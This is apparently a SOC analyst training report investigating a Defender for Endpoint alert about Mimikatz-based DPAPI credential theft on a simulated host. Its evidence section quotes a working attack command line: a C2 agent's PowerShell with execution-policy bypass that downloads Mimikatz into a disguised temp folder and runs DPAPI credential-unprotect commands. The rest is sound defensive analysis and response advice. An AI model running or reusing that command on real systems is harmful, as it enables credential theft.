# 🔍 Alert Investigation Report

> **Platform:** SOC Simulation Project — WDLabs  
> **Environment:** Microsoft Defender for Endpoint / Microsoft Sentinel

---

## 📋 Case Details

| Field | Value |
|---|---|
| **Alert Name** | Suspicious DPAPI Activity |
| **Alert ID / Link** | dae9ebb86f-3d3d-4d7a-a179-f7bdadd2d2ee_1| https://security.microsoft.com/alerts/dae9ebb86f-3d3d-4d7a-a179-f7bdadd2d2ee_1?tid=567ea528-4e82-40fa-914e-38c05fd69677 |
| **Analyst** | Ezekiel Ni |
| **Date Investigated** | 28/05/2026|
| **Severity** | `High`|

---

## 1. Alert Summary

- **Host / Account affected:**
Host: EC2AMAZ-90H9AQQ (denoted by the computer icon)
Account: NT AUTHORITY\SYSTEM (denoted by the user icon)
- **Date & Time of alert:**
May 28, 2026 9:16:15 PM (time that the alert was generated)
- **What triggered the alert:**
The alert was triggered by a behaviour-based detection (detection technology) of a suspicious application attempting to use the Data Protection API (DPAPI) to decrypt sensitive information or encrypt content for evasion (Alert Story -> What happened). 
- **Why it triggered (rule/logic):**
The alert triggered via Behavioural Analysis (detection technology), which identified powershell.exe [PID: 5808] (under Entity Name - it was the active process carrying out the suspicious behaviour) attempting to access the Data Protection API (DPAPI) for credential decryption - a technique associated with credential theft tools like Mimikatz (link under Entity Name to the Mimikatz Github repository and the version number provide the source of that activity). 

---

## 2. Investigation Findings

### What happened?
<!-- How was the activity executed or triggered? Walk through the technical detail. -->
An automated detection event identified wusvc.exe (under Process Tree, which is under Alert story -> What happened) initiating a PowerShell process (which can be seen in the Process Tree, under wusvc.exe) (powershell.exe, PID: 5808). This process successfully executed commands designed to leverage the Data Protection API (DPAPI) to decrypt sensitive local credentials. While the EDR granted the 'Suspicious DPAPI Activity' alert based on this behaviour, the Process Tree confirms that the malicious command script was fully parsed and executed on the host, consistent with Mimikatz-based credential theft. 

### Evidence
<!-- What artefacts, log entries, or indicators support your conclusion? -->

```
// Paste key log entries, process trees, or notable findings here
// Process Tree
[5888] nssm.exe
 └─ [7012] wusvc.exe -server http://172.31.2.203:8888 -group red
      └─ powershell.exe -ExecutionPolicy Bypass -C "$p = \"$env:TEMP\svcdiag3\"; New-Item -ItemType Directory -Path $p -Force | Out-Null; $zip = \"$p\kb97416.zip\"; (New-Object System.Net.WebClient).DownloadFile(  'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip',  $zip); Expand-Archive -Path $zip -DestinationPath $p -Force; $mimi = \"$p\x64\mimikatz.exe\"; if (Test-Path $mimi) {  & $mimi privilege::debug dpapi::cred /unprotect dpapi::cache exit 2>&1} else {  Write-Output \"Binary not found at expected path\"}"

// Notable Findings
- Detection Technology: Behaviour
- Associated Entity: Mimikatz GitHub Repository
- MITRE Category: Credential Access (Alert Details -> Categories)
```

### Was the activity successful?
- [x] Yes
- [ ] No
- [ ] Unknown
While the EDR successfully "Detected" the behavior and raised a high-severity alert, the status indicates that the process execution completed on the host. This confirms that the malicious PowerShell command was successfully parsed and executed, allowing the script to download and run the Mimikatz binary before an active "Block" or "Quarantine" action could be enforced. This scenario highlights a critical lesson for incident response: "Detection" is an alarm, not a guarantee of prevention. It underscores the necessity of immediate manual response actions—such as host isolation—to ensure the threat is fully contained and that any potential credential exposure is mitigated.

### Verdict
- [x] **Malicious**
- [ ] **Non-malicious**
- [ ] **Suspicious — requires further investigation**

**Justification:**
<!-- Why did you reach this conclusion? Be specific. -->

---
The automated behavioural analysis identified an unauthorised process (wusvc.exe) launching powershell.exe to perform DPAPI decryption. Furthermore, the system successfully correlated this activity with known indicators of the Mimikatz credential theft framework, confirming adversarial intent. While the security controls successfully detected the activity, telemetry confirms that the malicious command was executed on the endpoint. This successful execution allowed the attacker to reach the credential harvesting stage, necessitating an urgent response to contain the threat and mitigate potential credential exposure.

## 3. Investigation Steps

<!-- Walk through your process in order. What did you look at first? What led you to each pivot? -->

1. I analysed the primary alert details, specifically the Detection source (EDR) and Detection technology (Behaviour) to understand how the system identified the activity. 
2. I examined the Evidence section and the Process Tree, which revealed the full attack chain (nssm.exe -> wusvc.exe -> powershell.exe). This confirmed the persistence mechanism and the specific process responsible for the malicious activity.
3. I verified the execution status via the alert telemetry, which confirmed that the command successfully executed on the host. I then cross-referenced the activity with the MITRE ATT&CK category of Credential Access and the Mimikatz repository, confirming adversarial intent and the successful deployment of a credential theft tool.

## 4. Categorisation

- [x] ✅ **True Positive** — malicious activity confirmed
- [ ] ⚠️ **Benign True Positive** — alert fired correctly, activity is legitimate
- [ ] ❌ **False Positive** — alert fired incorrectly, rule needs review

- Malicious activity confirmed: The security platform detected a known credential theft tool (Mimikatz) and a behavioural attempt to access the Data Protection (DPAPI) to decrypt sensitive information. 
- Adversarial Intent: The presence of these indicators and the associated Process Tree demonstrates clear, hostile adversarial intent. The security controls successfully detected the activity, but the telemetry confirms the malicious command was executed on the host, necessitating an urgent response to contain the threat. 
---

## 5. Recommended Actions

**Escalation:**
- [x] Urgent — phone call required
- [ ] Non-urgent — email sufficient
- [ ] No escalation required
An escalation is necessary for the following reasons: 
- Hostile Intent: The attempt to execute Mimikatz and use DPAPI to harvest credentials is a high-severity threat. 
- Persistent Threat: The execution of these tools on an endpoint confirms that an attacker has gained a foothold and is actively probing the environment. This demands immediate containment and investigation to ensure the device is not further compromised and to identify the full scope of the breach.
- Proactive Security: An urgent escalation ensures that incident response teams can immediately isolate the affected machine and investigate how the attacker gained the capability to execute such a command, preventing future successful attempts. 

The attempt signifies a serious vulnerability that must be addressed immediately. 

**Containment / Next Steps:**
<!-- What should happen next? Free text — don't limit yourself to a checklist. -->
Immediately isolate the affected host (EC2AMAZ-90H9AQQ) from the network to prevent potential lateral movement or further command-and-control communication. Perform a full scan of the host using the EDR to identify any additional malicious artifacts or persistence mechanisms. Review all user accounts associated with this host for suspicious activity and trigger a mandatory password reset if any credential exposure is suspected. 

**Alert Tuning:**
- [x] Tune recommended —
- [ ] No tuning required
Justification: 
While the detection logic correctly identified the malicious behaviour, the alert failed to prevent the execution of the credential theft tool. The system flagged the activity as "Detected" but did not trigger an automated "Block" or "Quarantine" action until the attacker had already executed the Mimikatz command.
Recommendation:
Review the Microsoft Defender for Endpoint policy to ensure that "Block" mode is enabled for behavioural detections related to credential access. The goal is to move from "Detection" (alerting after the fact) to "Prevention" (blocking the process before it can access the DPAPI/LSASS memory space).
---

## 6. Lessons Learned

<!-- What would you do differently? Where did you go wrong or take a longer path than needed?
     This is the most valuable part of the write-up for your own growth and for anyone reading your portfolio. -->
I learned that while alerts can be overwhelming, the key to an efficient investigation is relying on the Process Tree and Detection Technology rather than manually hunting through excessive logs when the built-in evidence is sufficient. Moving forward, I will prioritise mapping suspicious behaviours to the MITRE ATT&CK framework immediately upon opening an alert to expedite my understanding of adversarial intent. Furthermore, I have learned the critical distinction between 'Detection' and 'Prevention'; I will no longer assume that an alert status of 'Detected' implies a successfully blocked threat, and I will verify the execution status of all high-severity processes to accurately assess organizational risk.

---

<details>
<summary>📚 About this template</summary>

This investigation template is from the **[SOC Simulation Project](https://www.skool.com/socsim/about)** by WDLabs / WebDefend Cyber Security — a hands-on training environment giving aspiring analysts access to Microsoft Defender for Endpoint and Microsoft Sentinel to investigate real alerts generated by emulated threat actor TTPs.

</details>
